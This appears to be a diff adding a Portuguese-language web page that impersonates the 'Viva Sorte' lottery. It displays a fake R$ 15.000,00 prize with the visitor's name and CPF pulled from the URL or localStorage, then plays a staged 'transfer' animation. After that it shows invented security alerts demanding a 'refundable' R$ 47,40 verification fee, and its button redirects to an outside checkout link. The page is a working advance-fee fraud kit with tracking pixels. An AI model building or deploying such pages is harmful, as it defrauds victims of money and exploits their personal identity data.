@@ -1,0 +1,525 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+    <script src="js/latest_1.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "6900c6ee33b3e27ee86ed867";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+  <meta charset="utf-8">
+<script>
+  window.pixelId = "67ef67b0655738af4b8dbdd8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Premiação Liberada - Viva Sorte</title>
+  <script>
+    localStorage.setItem("upsell", "up2");
+    </script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+
+    .card, .loading, .card-final {
+      padding-top: 0.5rem;
+      max-width: 420px;
+      width: 100%;
+      display: none;
+      flex-direction: column;
+      gap: 0.5rem;
+      background-color: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      padding: 1.5rem;
+    }
+
+    .loading {
+      margin-top: auto;
+      margin-bottom: 10rem;
+    }
+
+    .card.active, .loading.active, .card-final.active {
+      display: flex;
+    }
+
+    .logo { width: 120px; margin-bottom: 1.5rem; }
+    h2 { font-size: 1.3rem; margin-bottom: 0.3rem; color: #2f4eb5; }
+    .value {
+      font-size: 2rem;
+      font-weight: 800;
+      color: #2f4eb5;
+      margin-bottom: 0.5rem;
+    }
+
+    .recipient { font-size: 0.95rem; color: #444; margin-bottom: 1.5rem; }
+    .recipient b { font-weight: 600; }
+
+    .info-line {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.95rem;
+      margin-bottom: 0.8rem;
+      color: #444;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .box {
+      margin-top: 1.5rem;
+      background: #e9f2fb;
+      border: 1px solid #c8ddf0;
+      border-radius: 10px;
+      padding: 1rem;
+      font-size: 0.9rem;
+      color: #333;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    .button, .final-button {
+      display: block;
+      margin-top: 1.5rem;
+      width: 100%;
+      background-color: #2f4eb5;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      transition: background-color 0.2s;
+    }
+
+    .button:hover, .final-button:hover {
+      background-color: #1e3a8a;
+    }
+
+    .button:active, .final-button:active {
+      background-color: #1e40af;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 6px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background-color: #2f4eb5;
+      transition: width 0.1s linear;
+    }
+
+    .status-text {
+      font-size: 1.4rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+      color: #2f4eb5;
+    }
+
+    .fade-out-up { opacity: 0; transform: translateY(-20px); }
+    .fade-in-up { opacity: 1; transform: translateY(0); }
+
+    .wrapper-final {
+      background-color: #f5f7fa;
+      padding: 1rem;
+      border-radius: 1rem;
+      display: grid;
+      grid-template-rows: repeat(3, auto);
+      gap: 0.5rem;
+      min-height: 360px;
+      border: 1px solid #d8e2ed;
+    }
+
+    .alert-box {
+      background: #fff;
+      border-radius: 10px;
+      padding: 1rem;
+      display: none;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.95rem;
+      color: #333;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: fadeInUp 0.3s ease forwards;
+      border: 1px solid #e0e0e0;
+    }
+
+    .alert-box.red {
+      background: #f8d7da;
+      color: #721c24;
+      font-weight: bold;
+      border: 1px solid #f5c6cb;
+    }
+
+    @keyframes fadeInUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .icon-img { width: 2rem; height: 2rem; }
+
+    .spinner {
+      border: 3px solid #ccc;
+      border-top: 3px solid #2f4eb5;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 0.7s linear infinite;
+      margin: auto;
+    }
+    .novo-valor {
+  font-family: 'Inter', sans-serif; /* ou a fonte usada em .value */
+  font-weight: 700; /* negrito, se quiser manter o destaque */
+  font-size: 48px; /* ajuste conforme o tamanho desejado */
+  color: #2E47B1; /* mesmo azul da imagem */
+}
+
+.valor-personalizado {
+  font-family: 'Inter', sans-serif; /* mesma fonte usada em .value */
+  font-weight: 700; /* negrito */
+  color: #2E47B1; /* azul do modelo */
+}
+
+    .official-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 5px;
+      background: linear-gradient(to right, #2f4eb5 70%, #1e3a8a 30%);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+<div class="official-bar"></div>
+
+<!-- CARD INICIAL -->
+<div class="card active" id="card">
+  <img src="images/viva.png" class="logo" alt="Logo Viva Sorte">
+  <h2>Premiação Liberada</h2>
+<div class="novo-valor">R$ 15.000,00</div>
+  <div class="recipient">para <b id="nome-completo">Carregando...</b></div>
+  <div class="info-line"><span>CPF</span><span id="cpf">Carregando...</span></div>
+  <div class="info-line"><span>Tipo de transferência</span><span>Pix</span></div>
+  <div class="info-line"><span>Data</span><span id="data">Carregando...</span></div>
+  <div class="box">
+    Seus títulos Viva Sorte já estão liberados para resgate!
+    Clique no botão abaixo para autorizar a transferência da sua premiação para sua chave pix cadastrada.
+  </div>
+  <button class="button" onclick="iniciarTransferencia()">Resgatar meus títulos</button>
+</div>
+
+<!-- TELA DE CARREGAMENTO -->
+<div class="loading" id="loading">
+  <h2 id="status-text" class="status-text">Transferindo...</h2>
+  <div class="progress-bar">
+    <div class="progress-bar-fill" id="bar"></div>
+  </div>
+</div>
+
+<!-- CARD FINAL -->
+<div class="card-final" id="card-final">
+  <img src="images/viva.png" class="logo" alt="Logo Viva Sorte">
+  <h2 style="font-size: 1.4rem; margin-bottom: 1rem;">Atenção!</h2>
+
+  <div class="wrapper-final"></div>
+
+  <button class="final-button" onclick="redirecionarParaPagamento()">Pagar Taxa de Verificação</button>
+</div>
+
+<!-- Modal de Loading -->
+<div id="loadingModal" class="loading-modal">
+  <div class="loading-content">
+    <img src="images/viva.png" class="loading-logo" alt="Logo Viva Sorte">
+    <div class="loading-spinner">
+      <div class="spinner"></div>
+    </div>
+    <h3 id="loadingText" class="loading-text">Processando pagamento...</h3>
+    <p class="loading-subtitle">Aguarde, não feche esta página</p>
+    <div class="loading-progress">
+      <div class="progress-bar-loading">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+      <span class="progress-text" id="progressText">0%</span>
+    </div>
+  </div>
+</div>
+
+<style>
+.loading-modal {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.8);
+  z-index: 9999;
+  justify-content: center;
+  align-items: center;
+}
+
+.loading-modal.show {
+  display: flex;
+}
+
+.loading-content {
+  background: white;
+  border-radius: 12px;
+  padding: 2rem;
+  text-align: center;
+  max-width: 400px;
+  width: 90%;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+}
+
+.loading-logo {
+  width: 100px;
+  margin-bottom: 1.5rem;
+}
+
+.loading-spinner {
+  margin: 1rem 0;
+}
+
+.spinner {
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #2f4eb5;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin: 0 auto;
+}
+
+.loading-text {
+  color: #2f4eb5;
+  font-size: 1.3rem;
+  font-weight: 600;
+  margin: 1rem 0 0.5rem 0;
+}
+
+.loading-subtitle {
+  color: #666;
+  font-size: 0.9rem;
+  margin-bottom: 1.5rem;
+}
+
+.loading-progress {
+  margin-top: 1rem;
+}
+
+.progress-bar-loading {
+  width: 100%;
+  height: 8px;
+  background-color: #e0e0e0;
+  border-radius: 4px;
+  overflow: hidden;
+  margin-bottom: 0.5rem;
+}
+
+.progress-fill {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, #2f4eb5, #1e3a8a);
+  transition: width 0.3s ease;
+}
+
+.progress-text {
+  font-size: 0.9rem;
+  color: #2f4eb5;
+  font-weight: 600;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+
+<script>
+  // --- CÓDIGO MODIFICADO ---
+
+  const params = new URLSearchParams(window.location.search);
+
+  // 1. Define valores padrão
+  let nome = "Visitante";
+  let cpf = "";
+  
+  // 2. Tenta pegar o nome da URL, primeiro 'name', depois 'nome'
+  const nomeDaUrl = params.get("name") || params.get("nome");
+  if (nomeDaUrl) {
+    nome = nomeDaUrl;
+  }
+
+  // 3. Tenta pegar o CPF da URL pelo parâmetro 'document'
+  const cpfDaUrl = params.get("document");
+  if (cpfDaUrl) {
+      cpf = cpfDaUrl;
+  }
+  
+  // 4. Tenta pegar dados do localStorage, que podem sobrescrever os da URL
+  try {
+    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+    if (dadosUsuario) {
+      nome = dadosUsuario.nome || nome; // Usa o nome do localStorage se existir, senão mantém o da URL/padrão
+      cpf = dadosUsuario.cpf || cpf; // Usa o CPF do localStorage se existir, senão mantém o da URL
+    }
+    console.log('Dados carregados do localStorage:', dadosUsuario);
+  } catch (error) {
+    console.error('Erro ao carregar dados do localStorage:', error);
+  }
+
+
+  function formatCPF(cpf) {
+    const clean = cpf.replace(/\D/g, "");
+    return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+  }
+
+  function getFormattedDate() {
+    const d = new Date();
+    return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
+  }
+
+  document.getElementById("nome-completo").textContent = nome;
+  document.getElementById("cpf").textContent = cpf ? formatCPF(cpf) : "Não informado";
+  document.getElementById("data").textContent = getFormattedDate();
+
+
+  function exibirAlertasComSpinner() {
+    const alerts = [
+      { icon: "./images/aviso.png", text: "Identificamos uma movimentação suspeita nos seus títulos Viva Sorte!", red: false },
+      { icon: "./images/aviso.png", text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação para garantir o resgate seguro dos seus títulos.", red: false },
+      { 
+  icon: "./images/aviso.png", 
+  text: "Finalize o pagamento da Taxa de Verificação no valor de <b style='font-family:Inter, sans-serif; font-weight:700; color:#2E47B1;'>R$ 47,40</b> e confirme o resgate dos seus títulos. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", 
+  red: true 
+},
+
+    ];
+    const wrapper = document.querySelector(".wrapper-final");
+    wrapper.innerHTML = "";
+
+    let index = 0;
+    function showNext() {
+      if (index >= alerts.length) return;
+
+      const spinner = document.createElement("div");
+      spinner.className = "spinner";
+      wrapper.appendChild(spinner);
+
+      setTimeout(() => {
+        wrapper.removeChild(spinner);
+
+        const alert = document.createElement("div");
+        alert.className = `alert-box${alerts[index].red ? " red" : ""}`;
+        const icon = document.createElement("img");
+        icon.src = alerts[index].icon;
+        icon.className = "icon-img";
+
+        const text = document.createElement("div");
+        text.innerHTML = alerts[index].text;
+
+        alert.appendChild(icon);
+        alert.appendChild(text);
+        wrapper.appendChild(alert);
+
+        requestAnimationFrame(() => alert.style.display = "flex");
+
+        index++;
+        setTimeout(showNext, 900);
+      }, 1200);
+    }
+
+    showNext();
+  }
+
+  function iniciarTransferencia() {
+    document.getElementById("card").classList.remove("active");
+    document.getElementById("loading").classList.add("active");
+
+    const bar = document.getElementById("bar");
+    const statusText = document.getElementById("status-text");
+    let progress = 0;
+    let trocado = false;
+
+    const interval = setInterval(() => {
+      if (progress >= 100) {
+        clearInterval(interval);
+        document.getElementById("loading").classList.remove("active");
+        document.getElementById("card-final").classList.add("active");
+        exibirAlertasComSpinner();
+      } else {
+        progress++;
+        bar.style.width = progress + "%";
+
+        if (progress === 70 && !trocado) {
+          trocado = true;
+          statusText.classList.add("fade-out-up");
+          setTimeout(() => {
+            statusText.textContent = "Gerando Comprovante...";
+            statusText.classList.remove("fade-out-up");
+            statusText.classList.add("fade-in-up");
+          }, 400);
+        }
+      }
+    }, 50);
+  }
+
+  function redirecionarParaPagamento() {
+      // URL de destino
+      const baseUrl = 'https://www.pagamentos-seguro.link/checkout/c4664f3a-623a-44be-bf86-5afa2aa5118d';
+
+      // Pega todos os parâmetros da URL atual (ex: utm_source, utm_medium, etc.)
+      const currentParams = new URLSearchParams(window.location.search).toString();
+
+      // Monta a URL final, adicionando os parâmetros da URL atual ao link de destino
+      let redirectUrl = baseUrl;
+      if (currentParams) {
+          // Adiciona '?' se a URL base não tiver, ou '&' se já tiver, para concatenar os parâmetros
+          if (baseUrl.includes('?')) {
+              redirectUrl += '&' + currentParams;
+          } else {
+              redirectUrl += '?' + currentParams;
+          }
+      }
+      
+      // Redireciona o navegador do usuário para o link final instantaneamente
+      window.location.href = redirectUrl;
+  }
+
+</script>
+
+
+
+
+</body></html>
